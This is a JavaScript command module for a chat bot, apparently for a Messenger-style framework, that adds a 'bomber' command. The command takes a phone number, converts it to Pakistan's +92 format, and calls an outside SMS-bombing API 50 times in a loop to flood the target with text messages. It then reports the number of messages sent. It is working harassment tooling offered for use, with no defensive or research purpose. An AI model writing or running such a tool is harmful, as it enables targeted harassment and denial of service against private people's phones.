const axios = require("axios");

module.exports = {
  config: {
    name: "bomber",
    aliases: [],
    version: "1.0.0",
    credits: "CHAND",
    description: "Fun SMS bomber (50 messages max per request)",
    prefix: true,
    category: "system",
    usage: "bomber <number>"
  },

  async run({ api, event, args, send }) {
    const number = args[0];
    if (!number) {
      return send.reply(`📱 Please enter a mobile number!\n\n🔰 Example: \`bomber 0345XXXXXXX\``);
    }

    const target = number.startsWith("92") ? number : number.replace(/^0/, "92");

    try {
      let success = 0;
      const limit = 50;

      for (let i = 0; i < limit; i++) {
        const res = await axios.get(`https://shadowscriptz.xyz/public_apis/smsbomberapi.php?num=${target}`);
        if (res.data) success++;
      }

      const message = `
✨━━━━━━━━━━━━━━━━━━✨
         💣 SMS BOMBER Started! 💣

📱 Target Number: ${number}
✅ Messages Sent: ${success} / ${limit}

⚠️ Note: Limit is 50 messages per request.

✨━━━━━━━━━━━━━━━━━━✨
      `;

      return send.reply(message.trim());
    } catch (err) {
      console.error(err);
      return send.reply(`❌ Error during SMS sending!\n⚠️ Please check the number or try again later.`);
    }
  }
};
